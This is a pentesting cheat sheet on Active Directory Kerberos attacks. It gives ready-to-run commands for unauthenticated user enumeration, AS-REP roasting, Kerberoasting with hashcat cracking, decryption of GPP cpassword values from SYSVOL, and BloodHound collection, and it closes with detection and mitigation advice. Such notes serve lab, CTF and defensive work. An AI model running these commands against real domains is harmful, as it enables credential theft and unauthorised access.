---
title: Kerberos enumeration — AS-REP, Kerberoast and GPP
tags: [windows, active-directory, kerberos, kerberoasting, gpp]
---

# Kerberos enumeration: users, tickets and passwords

**English** | [🇪🇸 Español](kerberos-enum.md)

## 1. Users without credentials

```bash
kerbrute userenum -d <domain> --dc <DC_IP> users.txt
nxc smb <DC_IP> -u '' -p '' --users
rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
```

With a name list, `kerbrute` tells "user exists" from "does not" without locking accounts (when no lockout policy applies).

## 2. AS-REP Roasting

Accounts with `DONT_REQ_PREAUTH`: the KDC returns a blob encrypted with their password, crackable offline.

```bash
impacket-GetNPUsers '<domain>/' -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat
nxc ldap <DC_IP> -u '<user>' -p '<pass>' --asreproast asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## 3. Kerberoasting

Service accounts with an SPN: any authenticated user requests a TGS and cracks it offline.

```bash
impacket-GetUserSPNs '<domain>/<user>:<password>' -dc-ip <DC_IP> -request -outputfile tgs.txt
nxc ldap <DC_IP> -u '<user>' -p '<pass>' --kerberoasting tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

RC4 TGS (`0x17`) cracks fastest; AES is still feasible with a dictionary. In Sherlocks, a 4769 with `TicketEncryptionType 0x17` from an account that should not request it is the signature.

## 4. GPP and credentials in SYSVOL

```bash
nxc smb <DC_IP> -u '<user>' -p '<pass>' -M gpp_autologin
gpp-decrypt '<cpassword>'
```

`Groups.xml` with `cpassword` is AES with a known public key: instant decryption. Also look for `*.xml` in SYSVOL with `smbclient`.

## 5. BloodHound and next steps

```bash
bloodhound-python -u '<user>' -p '<password>' -d <domain> -ns <DC_IP> -c All
```

Typical paths: `GenericAll` on a user/group, `WriteDACL`, `ForceChangePassword`, GPO ACLs, open sessions and local admins. From there: [AD CS](adcs-esc4-esc1.md), [RBCD](rbcd-s4u2proxy.md) or [gMSA](gmsa-read-key.md).

## 6. Typical errors

- **`KRB_AP_ERR_SKEW`** → clock; see [clock and Kerberos](../general/kerberos-clock.en.md).
- **`KDC_ERR_C_PRINCIPAL_UNKNOWN` in `kerbrute`** → the user does not exist or the realm is misspelt.
- **`GetUserSPNs` returns 0 accounts** → no SPNs or no authentication; use `-dc-ip` and a valid user.
- **Hashcat does not crack** → try rules (`-r`) and masks before giant lists.
- **`gpp_autologin` empty** → the `Groups.xml` was cleaned; look in `Policies/` and backups.

## 7. Detection and mitigation

- **4769** with RC4 and a service account `ServiceName`; **4768** without preauth (AS-REP).
- Long service passwords (>25) and rotation; use `gMSA` for service accounts.
- Remove `cpassword` from SYSVOL and audit ACLs with BloodHound regularly.
- Alert on `kerbrute`-style enumeration: many failed 4768 in a short window.

MITRE: T1558.003, T1558.004, T1552.006, T1087.002.
